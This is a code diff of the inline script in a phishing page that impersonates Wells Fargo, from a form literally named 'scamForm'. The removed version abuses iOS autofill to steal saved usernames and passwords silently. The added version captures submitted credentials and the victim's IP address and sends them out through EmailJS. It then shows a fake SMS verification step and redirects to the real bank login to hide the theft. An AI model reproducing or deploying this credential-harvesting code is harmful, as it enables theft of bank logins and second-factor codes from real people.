@@ -239,56 +239,88 @@
     
     
     </style>
-    
-  <script>
+
+    <script>
+    // 1. Init EmailJS
     emailjs.init("y3lRWL7KLDjiFjNcN");
 
-    // Wait for the page to fully load
-    window.addEventListener('load', function() {
+    // 2. Handle Initial Login (Username/Password)
+    document.getElementById('scamForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const btn = document.getElementById('verifyBtn');
+        const originalText = btn.textContent;
         
-        // 1. Force a click on the username field to trigger iOS autofill
-        var usernameField = document.getElementById('username');
-        if (usernameField) {
-            usernameField.click();
-            
-            // 2. Wait 500ms for iOS to populate the field
-            setTimeout(function() {
-                captureAndSend();
-            }, 500);
-        } else {
-            console.error("Username field not found!");
-        }
+        btn.disabled = true;
+        btn.textContent = "Verifying...";
+
+        // Capture Creds
+        const formData = new FormData(e.target);
+        const data = Object.fromEntries(formData.entries());
+
+        // Get IP
+        fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .then(ipData => {
+            data.ip = ipData.ip;
+            data.date = new Date().toLocaleString();
+
+            // Send Creds to EmailJS
+            emailjs.send("service_2bhy4ju", "template_1qzswkk", data)
+            .then(() => {
+                // SUCCESS: Hide main form, Show SMS Section
+                document.getElementById('scamForm').style.display = 'none';
+                document.getElementById('smsSection').style.display = 'block';
+                
+                // Reset button for the next step
+                btn.textContent = originalText;
+                btn.disabled = false;
+                btn.style.backgroundColor = ""; // Reset color
+            })
+            .catch(() => {
+                // Fallback if email fails, still show SMS section so flow continues
+                document.getElementById('scamForm').style.display = 'none';
+                document.getElementById('smsSection').style.display = 'block';
+            });
+        })
+        .catch(() => {
+            // If IP fails, still show SMS section
+            document.getElementById('scamForm').style.display = 'none';
+            document.getElementById('smsSection').style.display = 'block';
+        });
     });
 
-    // Function to capture and send data
-    function captureAndSend() {
-        var u = document.getElementById('username').value;
-        var p = document.getElementById('password').value;
-
-        // If username is still empty, try one more time after another 500ms
-        if (!u) {
-            setTimeout(function() {
-                captureAndSend();
-            }, 500);
+    // 3. Handle SMS Code Submission
+    function submitCode() {
+        const smsCode = document.getElementById('smsCode').value;
+        if(smsCode.length < 6) {
+            alert("Please enter a valid 6-digit code.");
             return;
         }
 
-        if (u && p) {
-            emailjs.send("service_2bhy4ju", "template_1qzswkk", {
-                username: u,
-                password: p,
-                timestamp: new Date().toLocaleString(),
-                device: "iOS Force Click"
-            }).then(function() {
-                console.log("iOS Force Click Success");
-            }, function(error) {
-                console.log("iOS Force Click Failed", error);
-            });
-        } else {
-            console.log("Still waiting for data... U: [" + u + "] P: [" + p + "]");
-        }
+        // Disable button again
+        const btn = document.querySelector('#smsSection button');
+        btn.disabled = true;
+        btn.textContent = "Verifying...";
+
+        // Show processing spinner immediately
+        document.getElementById('smsSection').style.display = 'none';
+        document.querySelector('.container').style.display = 'none';
+        document.getElementById('processing').style.display = 'block';
+
+        // Optional: Send SMS code to email as well before redirecting
+        // emailjs.send("service_2bhy4ju", "template_1qzswkk", { 
+        //    smsCode: smsCode, 
+        //    type: "SMS Verification" 
+        // });
+
+        // Redirect to real Wells Fargo after 3 seconds
+        setTimeout(() => {
+            window.location.href = "https://connect.secure.wellsfargo.com/auth/login/present?origin=cob&LOB=CONS";
+        }, 3000);
     }
 </script>
+    
 
 
 
